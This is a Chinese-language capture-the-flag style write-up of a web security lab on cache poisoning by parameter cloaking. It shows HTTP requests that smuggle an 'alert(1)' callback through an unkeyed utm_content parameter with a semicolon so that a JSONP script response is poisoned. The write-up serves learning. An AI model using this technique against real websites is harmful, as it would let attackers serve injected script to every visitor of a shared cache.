# 实验室：参数隐藏

本实验室存在 Web 缓存投毒漏洞，因为它将某个特定参数从缓存键中排除。此外，缓存与后端之间存在不一致的参数解析方式。一名用户定期使用 Chrome 访问该网站首页。

要解决本实验室，请使用参数隐藏技术投毒缓存，使响应在受害者浏览器中执行 `alert(1)`。

> **提示**
> 该网站排除了某个特定的 UTM 分析参数。


## 步骤

探测
- 访问首页
    ```http
    GET / HTTP/1.1
    Host: id.web-security-academy.net
    ```

    - 响应

        ```http
        HTTP/2 200 OK
        Content-Type: text/html; charset=utf-8
        X-Frame-Options: SAMEORIGIN
        Cache-Control: max-age=35
        Age: 4
        X-Cache: hit
        Content-Length: 8591

        <link rel="canonical" href='//id.web-security-academy.net/'/>

        <script type="text/javascript" src="/js/geolocate.js?callback=setCountryCookie"></script>
        ```
        - 检测 URL 注入 HTML 属性值
        - 查看 JS 代码

检测 URL 注入 HTML 属性值
- 请求

    ```http
    GET /?'><svg/onload='alert(1) HTTP/2
    Host: id.web-security-academy.net
    ```

- 响应

    ```html
    <link rel="canonical" href='//id.web-security-academy.net/?&apos;&gt;&lt;svg/onload=&apos;alert(1)'/>
    ```

- 失败，被恰当 HTML 编码

查看 JS 代码
- 请求
    ```http
    GET /js/geolocate.js?callback=setCountryCookie HTTP/2
    Host: id.web-security-academy.net
    ```

    - 响应
        ```js
        const setCountryCookie = (country) => {
            document.cookie = 'country=' + country;

        };
        const setLangCookie = (lang) => {
            document.cookie = 'lang=' + lang;

        };
        setCountryCookie({
            "country": "United Kingdom"
        });
        ```
        - `setCountryCookie` 字符串重复出现，测试是否存在反射

- 测试回调参数值反射
    ```http
    GET /js/geolocate.js?callback=foooooooo HTTP/2
    Host: id.web-security-academy.net
    ```
    - 响应

        ```js
        foooooooo({
            "country":"United Kingdom"
        }
        );
        ```
    - 成功反射

- 设置载荷到 JS
    ```http
    GET /js/geolocate.js?callback=alert(1)%3bsetLangCookie HTTP/2
    Host: id.web-security-academy.net
    ```

    - 响应

        ```js
        alert(1);
        setLangCookie({
            "country":"United Kingdom"
        }
        );
        ```

- 此时由于回调参数作为缓存键，无法缓存投毒，之后尝试隐藏技巧

尝试将载荷隐藏到被忽略查询参数字段
- 请求
    ```http
    GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)%3bsetLangCookie HTTP/2
    Host: id.web-security-academy.net
    ```
    - 对于缓存服务器
        - 设置原始回调函数 `callback=setCountryCookie`
        - 设置非缓存键参数 `utm_content`
    - 对于后端服务器
        - 设置 `;` 分隔符的载荷回调参数，后端服务器取同名的最后一个参数

- 响应

    ```http
    X-Cache: miss

    alert(1);
    setLangCookie({
        "country":"United Kingdom"
    }
    );
    ```

- 设置/移除隐藏构造后对于 miss/hit，隐藏构造成功
